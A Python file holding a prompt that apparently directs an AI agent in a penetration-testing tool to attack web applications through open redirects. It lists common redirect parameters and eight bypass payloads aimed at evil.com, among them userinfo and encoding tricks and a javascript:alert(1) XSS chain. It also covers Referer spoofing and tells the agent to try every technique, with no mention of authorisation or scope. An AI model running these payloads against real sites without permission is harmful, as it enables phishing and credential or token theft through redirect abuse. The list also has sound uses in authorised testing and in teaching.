"""
Open Redirect Attack Skill Prompt.
"""

OPEN_REDIRECT_SKILL_PROMPT = r"""
## ATTACK SKILL: OPEN REDIRECT

### MANDATORY WORKFLOW

#### STEP 1: FIND REDIRECT PARAMETERS
Look for: `?redirect=`, `?url=`, `?next=`, `?return=`, `?goto=`, `?target=`, `?continue=`, `?r=`

#### STEP 2: BYPASS TECHNIQUES
```
//evil.com          -> protocol-relative bypass
\evil.com           -> backslash bypass (some parsers)
https:evil.com      -> colon without slashes
https%3A%2F%2Fevil.com -> URL-encoded
https://target.com@evil.com -> userinfo confusion
https://target.com.evil.com -> subdomain-like bypass
https://target.com%40evil.com -> URL parser confusion
javascript:alert(1) -> XSS chain (if redirect uses javascript:)
```

#### STEP 3: REFERER-BASED REDIRECT
Set `Referer: https://evil.com` header — some apps redirect back to referer.

#### ANTI-PATTERNS: Don't stop at the first bypass attempt — try ALL 8 techniques above.
"""
